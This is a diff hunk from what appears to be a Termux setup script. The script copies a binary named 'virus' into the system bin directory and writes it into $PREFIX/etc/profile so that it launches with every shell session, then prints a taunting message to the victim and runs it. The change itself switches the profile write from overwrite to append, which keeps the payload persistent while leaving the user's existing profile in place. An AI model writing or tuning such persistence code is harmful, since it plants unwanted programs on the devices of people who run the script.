@@ -14,7 +14,7 @@ apt install clang -y
 mv Hack virus
 cp virus $PREFIX/bin
 cd
-echo "virus" > $PREFIX/etc/profile
+echo "virus" >> $PREFIX/etc/profile
 echo "already late i install virus to your termux delete your termux loser !!"
 sleep 1
 virus
